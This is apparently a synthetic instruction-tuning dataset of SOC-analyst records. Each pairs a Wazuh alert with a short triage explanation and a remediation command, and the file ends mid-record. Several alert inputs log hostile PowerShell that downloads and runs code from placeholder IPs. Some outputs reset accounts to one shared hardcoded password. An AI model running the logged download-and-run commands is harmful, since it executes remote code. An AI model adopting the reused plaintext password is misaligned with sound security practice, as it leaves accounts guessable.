{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:35:27Z\",\"rule\":{\"id\":\"60231\",\"level\":13,\"description\":\"Kerberoasting activity suspected due to unusual service ticket requests\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"114\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4769\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"TargetUserName\":\"svc_sccm\",\"TicketEncryptionType\":\"0x17\",\"ServiceName\":\"HTTP/sccm01.corp.local\",\"IpAddress\":\"192.168.60.94\",\"AccountName\":\"pgupta\"}}},\"location\":\"Security\",\"full_log\":\"A Kerberos service ticket was requested for service account svc_sccm from workstation 192.168.60.94 using RC4 encryption\"}","output":"svc_sccm received a suspicious RC4-encrypted service ticket request that fits Kerberoasting. Reset the password for the service account and validate the requesting host 192.168.60.94. Remediation command: Set-ADAccountPassword -Identity \"svc_sccm\" -Reset -NewPassword (ConvertTo-SecureString \"Str0ng!Temp#2026\" -AsPlainText -Force)"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:38:01Z\",\"rule\":{\"id\":\"60231\",\"level\":13,\"description\":\"Kerberoasting activity suspected due to unusual service ticket requests\",\"groups\":\"windows,active_directory,credential_access\"},\"agent\":{\"id\":\"115\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4769\",\"channel\":\"Security\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"TargetUserName\":\"svc_backup\",\"TicketEncryptionType\":\"0x17\",\"ServiceName\":\"HOST/backup01.corp.local\",\"IpAddress\":\"192.168.60.97\",\"AccountName\":\"npatel\"}}},\"location\":\"Security\",\"full_log\":\"A Kerberos service ticket was requested for service account svc_backup from workstation 192.168.60.97 using RC4 encryption\"}","output":"A suspicious service ticket request for svc_backup suggests Kerberoasting from 192.168.60.97. Reset the account password immediately and review whether the SPN is still required. Remediation command: Set-ADAccountPassword -Identity \"svc_backup\" -Reset -NewPassword (ConvertTo-SecureString \"Str0ng!Temp#2026\" -AsPlainText -Force)"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:41:42Z\",\"rule\":{\"id\":\"60305\",\"level\":14,\"description\":\"Suspicious LSASS memory access detected\",\"groups\":\"windows,credential_access,defense_evasion\"},\"agent\":{\"id\":\"116\",\"name\":\"ws-fin-07\",\"ip\":\"192.168.61.21\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"10\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"ws-fin-07.corp.local\"},\"eventdata\":{\"SourceImage\":\"C:\\\\Users\\\\Public\\\\procdump64.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1fffff\",\"SourceUser\":\"CORP\\\\jdoe\"}}},\"location\":\"Microsoft-Windows-Sysmon/Operational\",\"full_log\":\"Process access detected: procdump64.exe accessed lsass.exe with high privileges\"}","output":"procdump64.exe accessed LSASS memory on ws-fin-07, which strongly suggests credential dumping. Terminate the dumping process immediately and isolate the workstation from the network. Remediation command: Stop-Process -Name \"procdump64\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:44:16Z\",\"rule\":{\"id\":\"60305\",\"level\":14,\"description\":\"Suspicious LSASS memory access detected\",\"groups\":\"windows,credential_access,defense_evasion\"},\"agent\":{\"id\":\"117\",\"name\":\"ws-hr-04\",\"ip\":\"192.168.61.22\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"10\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"ws-hr-04.corp.local\"},\"eventdata\":{\"SourceImage\":\"C:\\\\Temp\\\\nanodump.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1fffff\",\"SourceUser\":\"CORP\\\\anita\"}}},\"location\":\"Microsoft-Windows-Sysmon/Operational\",\"full_log\":\"Process access detected: nanodump.exe accessed lsass.exe with high privileges\"}","output":"nanodump.exe attempted to read LSASS on ws-hr-04, which is typical of credential theft. Kill the process immediately and begin host triage for additional tools or persistence. Remediation command: Stop-Process -Name \"nanodump\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:46:53Z\",\"rule\":{\"id\":\"60305\",\"level\":14,\"description\":\"Suspicious LSASS memory access detected\",\"groups\":\"windows,credential_access,defense_evasion\"},\"agent\":{\"id\":\"118\",\"name\":\"ws-it-11\",\"ip\":\"192.168.61.23\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"10\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"ws-it-11.corp.local\"},\"eventdata\":{\"SourceImage\":\"C:\\\\Users\\\\Public\\\\rundll32.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1410\",\"SourceUser\":\"CORP\\\\unknown\"}}},\"location\":\"Microsoft-Windows-Sysmon/Operational\",\"full_log\":\"Process access detected: rundll32.exe accessed lsass.exe in a suspicious manner\"}","output":"rundll32.exe accessed LSASS on ws-it-11 in a suspicious way consistent with credential theft or injection. Stop the process immediately and investigate the parent process chain. Remediation command: Stop-Process -Name \"rundll32\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:49:25Z\",\"rule\":{\"id\":\"60305\",\"level\":14,\"description\":\"Suspicious LSASS memory access detected\",\"groups\":\"windows,credential_access,defense_evasion\"},\"agent\":{\"id\":\"119\",\"name\":\"ws-legal-02\",\"ip\":\"192.168.61.24\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"10\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"ws-legal-02.corp.local\"},\"eventdata\":{\"SourceImage\":\"C:\\\\Users\\\\Public\\\\mimikatz.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1fffff\",\"SourceUser\":\"CORP\\\\legal1\"}}},\"location\":\"Microsoft-Windows-Sysmon/Operational\",\"full_log\":\"Process access detected: mimikatz.exe accessed lsass.exe with full access\"}","output":"mimikatz.exe accessed LSASS on ws-legal-02, which is a direct credential dumping indicator. Stop the tool immediately and isolate the endpoint for full incident response. Remediation command: Stop-Process -Name \"mimikatz\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:51:58Z\",\"rule\":{\"id\":\"60305\",\"level\":14,\"description\":\"Suspicious LSASS memory access detected\",\"groups\":\"windows,credential_access,defense_evasion\"},\"agent\":{\"id\":\"120\",\"name\":\"ws-sales-09\",\"ip\":\"192.168.61.25\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"10\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"ws-sales-09.corp.local\"},\"eventdata\":{\"SourceImage\":\"C:\\\\Windows\\\\Temp\\\\dumpert.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1fffff\",\"SourceUser\":\"CORP\\\\sales2\"}}},\"location\":\"Microsoft-Windows-Sysmon/Operational\",\"full_log\":\"Process access detected: dumpert.exe accessed lsass.exe with full access\"}","output":"dumpert.exe accessed LSASS on ws-sales-09, indicating likely credential dumping. Terminate the process at once and investigate whether stolen credentials were used elsewhere. Remediation command: Stop-Process -Name \"dumpert\" -Force"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:55:37Z\",\"rule\":{\"id\":\"60322\",\"level\":13,\"description\":\"Possible Pass-the-Hash lateral movement via NTLM network logon\",\"groups\":\"windows,lateral_movement,authentication\"},\"agent\":{\"id\":\"121\",\"name\":\"fs01\",\"ip\":\"192.168.61.40\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4624\",\"channel\":\"Security\",\"computer\":\"fs01.corp.local\"},\"eventdata\":{\"LogonType\":\"3\",\"TargetUserName\":\"administrator\",\"AuthenticationPackageName\":\"NTLM\",\"WorkstationName\":\"WS-HR-04\",\"IpAddress\":\"192.168.61.22\",\"ProcessName\":\"C:\\\\Windows\\\\System32\\\\services.exe\"}}},\"location\":\"Security\",\"full_log\":\"An account was successfully logged on. Logon Type: 3 User: administrator Auth Package: NTLM Source Network Address: 192.168.61.22\"}","output":"An NTLM network logon to fs01 using administrator from WS-HR-04 suggests possible Pass-the-Hash lateral movement. Disable the account until the source host is investigated and credentials are reset. Remediation command: Disable-ADAccount -Identity \"administrator\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T13:58:14Z\",\"rule\":{\"id\":\"60322\",\"level\":13,\"description\":\"Possible Pass-the-Hash lateral movement via NTLM network logon\",\"groups\":\"windows,lateral_movement,authentication\"},\"agent\":{\"id\":\"122\",\"name\":\"sql01\",\"ip\":\"192.168.61.41\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4624\",\"channel\":\"Security\",\"computer\":\"sql01.corp.local\"},\"eventdata\":{\"LogonType\":\"3\",\"TargetUserName\":\"dbadmin\",\"AuthenticationPackageName\":\"NTLM\",\"WorkstationName\":\"WS-FIN-07\",\"IpAddress\":\"192.168.61.21\",\"ProcessName\":\"C:\\\\Windows\\\\System32\\\\winlogon.exe\"}}},\"location\":\"Security\",\"full_log\":\"An account was successfully logged on. Logon Type: 3 User: dbadmin Auth Package: NTLM Source Network Address: 192.168.61.21\"}","output":"A network NTLM logon to sql01 using dbadmin from WS-FIN-07 may indicate Pass-the-Hash abuse. Disable the account temporarily and verify whether the source workstation is compromised. Remediation command: Disable-ADAccount -Identity \"dbadmin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:00:49Z\",\"rule\":{\"id\":\"60322\",\"level\":13,\"description\":\"Possible Pass-the-Hash lateral movement via NTLM network logon\",\"groups\":\"windows,lateral_movement,authentication\"},\"agent\":{\"id\":\"123\",\"name\":\"dc01\",\"ip\":\"192.168.60.10\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4624\",\"channel\":\"Security\",\"computer\":\"dc01.corp.local\"},\"eventdata\":{\"LogonType\":\"3\",\"TargetUserName\":\"svc-admin\",\"AuthenticationPackageName\":\"NTLM\",\"WorkstationName\":\"WS-SALES-09\",\"IpAddress\":\"192.168.61.25\",\"ProcessName\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\"}}},\"location\":\"Security\",\"full_log\":\"An account was successfully logged on. Logon Type: 3 User: svc-admin Auth Package: NTLM Source Network Address: 192.168.61.25\"}","output":"An NTLM network logon to the domain controller using svc-admin from WS-SALES-09 is highly suspicious for Pass-the-Hash. Disable the account immediately and isolate the source workstation. Remediation command: Disable-ADAccount -Identity \"svc-admin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:03:18Z\",\"rule\":{\"id\":\"60322\",\"level\":13,\"description\":\"Possible Pass-the-Hash lateral movement via NTLM network logon\",\"groups\":\"windows,lateral_movement,authentication\"},\"agent\":{\"id\":\"124\",\"name\":\"app01\",\"ip\":\"192.168.61.42\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4624\",\"channel\":\"Security\",\"computer\":\"app01.corp.local\"},\"eventdata\":{\"LogonType\":\"3\",\"TargetUserName\":\"appadmin\",\"AuthenticationPackageName\":\"NTLM\",\"WorkstationName\":\"WS-LEGAL-02\",\"IpAddress\":\"192.168.61.24\",\"ProcessName\":\"C:\\\\Windows\\\\System32\\\\services.exe\"}}},\"location\":\"Security\",\"full_log\":\"An account was successfully logged on. Logon Type: 3 User: appadmin Auth Package: NTLM Source Network Address: 192.168.61.24\"}","output":"appadmin authenticated to app01 over NTLM from WS-LEGAL-02 in a pattern consistent with Pass-the-Hash. Disable the account until the source system and credential exposure are assessed. Remediation command: Disable-ADAccount -Identity \"appadmin\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:05:41Z\",\"rule\":{\"id\":\"60322\",\"level\":13,\"description\":\"Possible Pass-the-Hash lateral movement via NTLM network logon\",\"groups\":\"windows,lateral_movement,authentication\"},\"agent\":{\"id\":\"125\",\"name\":\"backup01\",\"ip\":\"192.168.61.43\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4624\",\"channel\":\"Security\",\"computer\":\"backup01.corp.local\"},\"eventdata\":{\"LogonType\":\"3\",\"TargetUserName\":\"backupsvc\",\"AuthenticationPackageName\":\"NTLM\",\"WorkstationName\":\"WS-IT-11\",\"IpAddress\":\"192.168.61.23\",\"ProcessName\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\"}}},\"location\":\"Security\",\"full_log\":\"An account was successfully logged on. Logon Type: 3 User: backupsvc Auth Package: NTLM Source Network Address: 192.168.61.23\"}","output":"An NTLM network logon using backupsvc from WS-IT-11 to backup01 may represent Pass-the-Hash or stolen credentials. Disable the service account immediately and investigate recent use of its hash or password. Remediation command: Disable-ADAccount -Identity \"backupsvc\""}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:09:12Z\",\"rule\":{\"id\":\"60341\",\"level\":14,\"description\":\"Suspicious remote service creation detected\",\"groups\":\"windows,lateral_movement,psexec\"},\"agent\":{\"id\":\"126\",\"name\":\"dc02\",\"ip\":\"192.168.60.11\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"7045\",\"channel\":\"System\",\"computer\":\"dc02.corp.local\"},\"eventdata\":{\"ServiceName\":\"PSEXESVC\",\"ImagePath\":\"C:\\\\Windows\\\\PSEXESVC.exe\",\"ServiceStartType\":\"demand start\",\"AccountName\":\"LocalSystem\"}}},\"location\":\"System\",\"full_log\":\"A service was installed in the system. Service Name: PSEXESVC File Name: C:\\\\Windows\\\\PSEXESVC.exe\"}","output":"PSEXESVC was installed on dc02, indicating likely PsExec-based lateral movement to a domain controller. Stop and remove the service immediately, then investigate the source host. Remediation command: sc.exe delete PSEXESVC"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:11:46Z\",\"rule\":{\"id\":\"60341\",\"level\":14,\"description\":\"Suspicious remote service creation detected\",\"groups\":\"windows,lateral_movement,psexec\"},\"agent\":{\"id\":\"127\",\"name\":\"sql01\",\"ip\":\"192.168.61.41\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"7045\",\"channel\":\"System\",\"computer\":\"sql01.corp.local\"},\"eventdata\":{\"ServiceName\":\"remcomsvc\",\"ImagePath\":\"C:\\\\Windows\\\\Temp\\\\remcomsvc.exe\",\"ServiceStartType\":\"auto start\",\"AccountName\":\"LocalSystem\"}}},\"location\":\"System\",\"full_log\":\"A service was installed in the system. Service Name: remcomsvc File Name: C:\\\\Windows\\\\Temp\\\\remcomsvc.exe\"}","output":"remcomsvc was created on sql01, which is commonly used for remote execution and lateral movement. Remove the service immediately and review recent admin share access to the host. Remediation command: sc.exe delete remcomsvc"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:14:19Z\",\"rule\":{\"id\":\"60341\",\"level\":14,\"description\":\"Suspicious remote service creation detected\",\"groups\":\"windows,lateral_movement,psexec\"},\"agent\":{\"id\":\"128\",\"name\":\"fs01\",\"ip\":\"192.168.61.40\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"7045\",\"channel\":\"System\",\"computer\":\"fs01.corp.local\"},\"eventdata\":{\"ServiceName\":\"WinUpdateSvc\",\"ImagePath\":\"C:\\\\Windows\\\\Temp\\\\updater.exe\",\"ServiceStartType\":\"demand start\",\"AccountName\":\"LocalSystem\"}}},\"location\":\"System\",\"full_log\":\"A service was installed in the system. Service Name: WinUpdateSvc File Name: C:\\\\Windows\\\\Temp\\\\updater.exe\"}","output":"A suspicious service named WinUpdateSvc was installed from a temp path on fs01, which is not normal for legitimate updates. Remove the service and inspect the binary for malicious remote execution. Remediation command: sc.exe delete WinUpdateSvc"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:16:53Z\",\"rule\":{\"id\":\"60341\",\"level\":14,\"description\":\"Suspicious remote service creation detected\",\"groups\":\"windows,lateral_movement,psexec\"},\"agent\":{\"id\":\"129\",\"name\":\"app01\",\"ip\":\"192.168.61.42\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"7045\",\"channel\":\"System\",\"computer\":\"app01.corp.local\"},\"eventdata\":{\"ServiceName\":\"mssecsvc2.0\",\"ImagePath\":\"C:\\\\Windows\\\\Temp\\\\mssecsvc.exe\",\"ServiceStartType\":\"auto start\",\"AccountName\":\"LocalSystem\"}}},\"location\":\"System\",\"full_log\":\"A service was installed in the system. Service Name: mssecsvc2.0 File Name: C:\\\\Windows\\\\Temp\\\\mssecsvc.exe\"}","output":"mssecsvc2.0 was installed on app01 from a temporary location, which is suspicious and may indicate wormable malware or remote execution. Remove the service immediately and begin malware containment. Remediation command: sc.exe delete mssecsvc2.0"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:19:28Z\",\"rule\":{\"id\":\"60341\",\"level\":14,\"description\":\"Suspicious remote service creation detected\",\"groups\":\"windows,lateral_movement,psexec\"},\"agent\":{\"id\":\"130\",\"name\":\"backup01\",\"ip\":\"192.168.61.43\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"7045\",\"channel\":\"System\",\"computer\":\"backup01.corp.local\"},\"eventdata\":{\"ServiceName\":\"svc_host_patch\",\"ImagePath\":\"C:\\\\ProgramData\\\\svc_host_patch.exe\",\"ServiceStartType\":\"demand start\",\"AccountName\":\"LocalSystem\"}}},\"location\":\"System\",\"full_log\":\"A service was installed in the system. Service Name: svc_host_patch File Name: C:\\\\ProgramData\\\\svc_host_patch.exe\"}","output":"A suspicious service named svc_host_patch was created on backup01 and may support remote execution or persistence. Remove the service immediately and preserve the binary for forensic analysis. Remediation command: sc.exe delete svc_host_patch"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:23:02Z\",\"rule\":{\"id\":\"60366\",\"level\":13,\"description\":\"Scheduled task created with suspicious PowerShell payload\",\"groups\":\"windows,persistence,execution\"},\"agent\":{\"id\":\"131\",\"name\":\"ws-fin-07\",\"ip\":\"192.168.61.21\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4698\",\"channel\":\"Security\",\"computer\":\"ws-fin-07.corp.local\"},\"eventdata\":{\"TaskName\":\"\\\\AdobeUpdateCheck\",\"TaskContent\":\"powershell.exe -nop -w hidden -enc SQBFAFgA...\",\"SubjectUserName\":\"jdoe\"}}},\"location\":\"Security\",\"full_log\":\"A scheduled task was created. Task Name: \\\\AdobeUpdateCheck Action: powershell.exe -nop -w hidden -enc SQBFAFgA...\"}","output":"A scheduled task on ws-fin-07 was created to run hidden encoded PowerShell, which is typical of persistence or malware staging. Remove the task immediately and review the initiating user jdoe. Remediation command: Unregister-ScheduledTask -TaskName \"AdobeUpdateCheck\" -Confirm:$false"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:25:35Z\",\"rule\":{\"id\":\"60366\",\"level\":13,\"description\":\"Scheduled task created with suspicious PowerShell payload\",\"groups\":\"windows,persistence,execution\"},\"agent\":{\"id\":\"132\",\"name\":\"ws-hr-04\",\"ip\":\"192.168.61.22\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4698\",\"channel\":\"Security\",\"computer\":\"ws-hr-04.corp.local\"},\"eventdata\":{\"TaskName\":\"\\\\ChromeUpdater\",\"TaskContent\":\"powershell.exe -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\upd.ps1\",\"SubjectUserName\":\"anita\"}}},\"location\":\"Security\",\"full_log\":\"A scheduled task was created. Task Name: \\\\ChromeUpdater Action: powershell.exe -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\upd.ps1\"}","output":"ws-hr-04 created a scheduled task that launches PowerShell with bypass settings from ProgramData, which is suspicious for persistence. Delete the task and inspect upd.ps1 for malicious behavior. Remediation command: Unregister-ScheduledTask -TaskName \"ChromeUpdater\" -Confirm:$false"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:28:08Z\",\"rule\":{\"id\":\"60366\",\"level\":13,\"description\":\"Scheduled task created with suspicious PowerShell payload\",\"groups\":\"windows,persistence,execution\"},\"agent\":{\"id\":\"133\",\"name\":\"ws-it-11\",\"ip\":\"192.168.61.23\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4698\",\"channel\":\"Security\",\"computer\":\"ws-it-11.corp.local\"},\"eventdata\":{\"TaskName\":\"\\\\OneDrive Sync Service\",\"TaskContent\":\"cmd.exe /c powershell -nop -enc UwB0AGEAZwBl...\",\"SubjectUserName\":\"unknown\"}}},\"location\":\"Security\",\"full_log\":\"A scheduled task was created. Task Name: \\\\OneDrive Sync Service Action: cmd.exe /c powershell -nop -enc UwB0AGEAZwBl...\"}","output":"A fake OneDrive task on ws-it-11 runs encoded PowerShell through cmd.exe, which strongly suggests persistence. Remove the task immediately and inspect recent process execution history. Remediation command: Unregister-ScheduledTask -TaskName \"OneDrive Sync Service\" -Confirm:$false"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:30:41Z\",\"rule\":{\"id\":\"60366\",\"level\":13,\"description\":\"Scheduled task created with suspicious PowerShell payload\",\"groups\":\"windows,persistence,execution\"},\"agent\":{\"id\":\"134\",\"name\":\"ws-legal-02\",\"ip\":\"192.168.61.24\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4698\",\"channel\":\"Security\",\"computer\":\"ws-legal-02.corp.local\"},\"eventdata\":{\"TaskName\":\"\\\\DefenderPatch\",\"TaskContent\":\"powershell.exe -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\",\"SubjectUserName\":\"legal1\"}}},\"location\":\"Security\",\"full_log\":\"A scheduled task was created. Task Name: \\\\DefenderPatch Action: powershell.exe -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\"}","output":"ws-legal-02 registered a scheduled task that downloads and executes remote PowerShell code, which is clear malicious persistence. Remove the task immediately and block the referenced infrastructure. Remediation command: Unregister-ScheduledTask -TaskName \"DefenderPatch\" -Confirm:$false"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:33:16Z\",\"rule\":{\"id\":\"60366\",\"level\":13,\"description\":\"Scheduled task created with suspicious PowerShell payload\",\"groups\":\"windows,persistence,execution\"},\"agent\":{\"id\":\"135\",\"name\":\"ws-sales-09\",\"ip\":\"192.168.61.25\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4698\",\"channel\":\"Security\",\"computer\":\"ws-sales-09.corp.local\"},\"eventdata\":{\"TaskName\":\"\\\\WinCheck\",\"TaskContent\":\"powershell.exe -WindowStyle Hidden -Command Start-Process C:\\\\Users\\\\Public\\\\agent.exe\",\"SubjectUserName\":\"sales2\"}}},\"location\":\"Security\",\"full_log\":\"A scheduled task was created. Task Name: \\\\WinCheck Action: powershell.exe -WindowStyle Hidden -Command Start-Process C:\\\\Users\\\\Public\\\\agent.exe\"}","output":"A hidden PowerShell-backed scheduled task was created on ws-sales-09 to launch a public executable, which is suspicious persistence. Remove the task now and quarantine agent.exe for analysis. Remediation command: Unregister-ScheduledTask -TaskName \"WinCheck\" -Confirm:$false"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:37:02Z\",\"rule\":{\"id\":\"60411\",\"level\":14,\"description\":\"Suspicious PowerShell downloading content from external IP\",\"groups\":\"windows,powershell,command_and_control\"},\"agent\":{\"id\":\"136\",\"name\":\"ws-marketing-03\",\"ip\":\"192.168.61.26\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4104\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"ws-marketing-03.corp.local\"},\"eventdata\":{\"ScriptBlockText\":\"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/payload.ps1')\",\"UserId\":\"CORP\\\\mktg1\"}}},\"location\":\"Microsoft-Windows-PowerShell/Operational\",\"full_log\":\"PowerShell script block logged: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/payload.ps1')\"}","output":"PowerShell on ws-marketing-03 downloaded and executed a remote script from 203.0.113.88, indicating likely malware or C2 staging. Block the external IP immediately and isolate the host if execution succeeded. Remediation command: New-NetFirewallRule -DisplayName \"Block_Malicious_203.0.113.88\" -Direction Outbound -RemoteAddress 203.0.113.88 -Action Block"}
{"instruction":"You are a SOC Analyst. Analyze this Wazuh security alert and provide a brief explanation and a specific remediation command.","input":"{\"timestamp\":\"2026-03-14T14:39:33Z\",\"rule\":{\"id\":\"60411\",\"level\":14,\"description\":\"Suspicious PowerShell downloading content from external IP\",\"groups\":\"windows,powershell,command_and_control\"},\"agent\":{\"id\":\"137\",\"name\":\"ws-fin-08\",\"ip\":\"192.168.61.27\"},\"manager\":{\"name\":\"wazuh-manager\"},\"decoder\":{\"name\":\"windows_eventchannel\"},\"data\":{\"win\":{\"system\":{\"eventID\":\"4104\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"ws-fin-08.corp.local\"},\"eventdata\":{\"ScriptBlockText\":\"Invoke-WebRequest -Uri http://198.51.100.44/a.exe -OutFile C:\\\\Users\\\\Public\\\\a.exe\",\"UserId\":\"CORP\\\\fin2\"}}},\"location\":\"Microsoft-Windows-PowerShell/Operational\",\"full_log\":\"PowerShell script block logged: Invoke-WebRequest -Uri http://198.51.100.44/a.exe -OutFile C:\\\\Users\\\\Public\\\\a.exe\"}","output":"PowerShell on ws-fin-08 attempted to download an external executable from 198.51.100.44. Block the IP immediately and inspect whether the downloaded file was executed. Remediation command: New-NetFirewallRule -DisplayName 